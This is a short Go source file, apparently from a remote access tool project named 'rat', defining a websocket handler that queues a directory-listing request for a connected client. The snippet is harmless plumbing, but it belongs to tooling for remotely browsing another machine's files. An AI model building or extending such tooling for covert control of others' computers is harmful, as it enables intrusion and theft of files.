package main

import (
	"rat/shared/network/header"

	"golang.org/x/net/websocket"
)

type DirectoryRequestMessage struct {
	Path string `json:"path"`
}

func (d DirectoryRequestMessage) Handle(ws *websocket.Conn, client *Client, data string) error {
	client.Listeners[header.DirectoryHeader] = ws
	client.Queue <- &DirectoryPacket{Path: d.Path}

	return nil
}
